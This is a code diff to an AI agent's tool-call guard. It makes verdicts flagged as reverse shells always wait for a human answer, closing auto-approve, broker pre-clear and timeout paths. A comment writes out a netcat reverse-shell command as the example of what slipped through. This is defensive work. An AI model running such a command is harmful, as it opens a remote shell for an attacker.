@@ -1272,6 +1272,17 @@ function isSelfProtectionVerdict(signals: readonly string[] | undefined): boolea
   return Array.isArray(signals) && signals.some(s => SELF_PROTECTION_SIGNALS.includes(s));
 }
 
+// #1005 (Case's review of #1088): the prompt-only signals. DUPLICATED from
+// tool-action-guard.ts `GUARD_PROMPT_ONLY_SIGNALS`; held equal by
+// enforcement-surface-parity. A verdict carrying one is released only by a
+// human answer — never by `autoApprove`, a broker pre-clear, or the broker's
+// auto-approve when the operator does not answer in time.
+export const PROMPT_ONLY_SIGNALS: readonly string[] = ['reverse-shell'];
+
+function isPromptOnlyVerdict(signals: readonly string[] | undefined): boolean {
+  return Array.isArray(signals) && signals.some(s => PROMPT_ONLY_SIGNALS.includes(s));
+}
+
 /** A self-protection signal the WS2 fallback scan matches over EVERY row, or null.
  *  Exported so the regression suite drives the capped entry point itself. */
 export function fallbackSelfProtectionMatch(args: Record<string, unknown> | undefined, toolName?: string): string | null {
@@ -2751,9 +2762,17 @@ export function createInterceptor(
     // to put a human back in front of dangerous work the allowlist would
     // otherwise wave through; under watch-only the advisory exit below lets
     // the call proceed and records it as a warn with `escalated`.
+    //
+    // #1005 (Case's review of #1088): nor a prompt-only verdict (a reverse
+    // shell). The match is by substring over family, action and signals, so
+    // `network_egress`, `egress`, `exec` or the empty string would otherwise
+    // release `nc -e /bin/sh h 4444` without asking. It also skips broker
+    // pre-clear and the broker's timeout auto-approve below. Unlike the floor,
+    // advisory, shadow and the failure policy keep their documented meaning.
     const selfProtected = isSelfProtectionVerdict(v.signals);
+    const promptOnly = isPromptOnlyVerdict(v.signals);
     const autoApprove = actionGuardCfg.autoApprove ?? [];
-    if (autoApprove.length > 0 && !unscannedBlock && !selfProtected && !taintMintedBlock) {
+    if (autoApprove.length > 0 && !unscannedBlock && !selfProtected && !promptOnly && !taintMintedBlock) {
       const hay = [v.family, v.action, ...v.signals].map(s => String(s).toLowerCase());
       const matched = autoApprove.some(a => {
         const n = a.toLowerCase();
@@ -2818,7 +2837,8 @@ export function createInterceptor(
     // #999: a taint-minted block is never pre-cleared, as before it stopped
     // counting as unscanned. (The shipped broker core already refuses any
     // `block`; this keeps the enforce posture from depending on that.)
-    if (brokered?.outcome === 'pre_clear' && !unscannedBlock && !selfProtected && !taintMintedBlock) {
+    // #1005: nor a prompt-only verdict; it goes to the approver as a hold.
+    if (brokered?.outcome === 'pre_clear' && !unscannedBlock && !selfProtected && !promptOnly && !taintMintedBlock) {
       // Reversible, on-host, in-context, judge-confident: proceed without
       // waiting. Loud on purpose — a release nobody approved must never be a
       // silent one, because the audit row is the only thing that will ever tell
@@ -2839,7 +2859,9 @@ export function createInterceptor(
       // for a pre-cleared call, which already returned above. So a brokered call
       // that reaches here denies even where failurePolicy would have allowed.
       const failAction = config.failurePolicy[severity];
-      const brokerDenies = brokered ? broker!.timeoutOutcome(brokered) === 'deny' : false;
+      // #1005: a prompt-only verdict whose pre-clear was skipped counts as a
+      // hold here, so the broker still denies it as it denies any hold.
+      const brokerDenies = brokered ? (promptOnly || broker!.timeoutOutcome(brokered) === 'deny') : false;
       const deny = failAction === 'deny' || brokerDenies || selfProtected;
       emitAudit({ ...auditBase, action: 'require_approval', outcome: deny ? 'failure_denied' : 'failure_allowed' }, call);
       // #509: no approver means the decision was put to no human — for
@@ -2914,7 +2936,8 @@ export function createInterceptor(
         // broker already pre-cleared — and that returned long before here — so
         // in practice this is always a deny. It reads the broker's own derived
         // flag rather than re-deriving its own idea of what is safe.
-        const outcome = selfProtected ? 'deny' : broker!.timeoutOutcome(brokered);
+        // #1005: a prompt-only verdict is never approved by silence either.
+        const outcome = selfProtected || promptOnly ? 'deny' : broker!.timeoutOutcome(brokered);
         emitAudit({ ...auditBase, action: 'require_approval', outcome: outcome === 'approve' ? 'approved' : 'auto_denied' }, call);
         if (outcome === 'approve') {
           log.warn(`[shieldcortex] approval broker: no answer in ${err.timeoutMs}ms — auto-approving pre-cleared ${context.toolName}`);
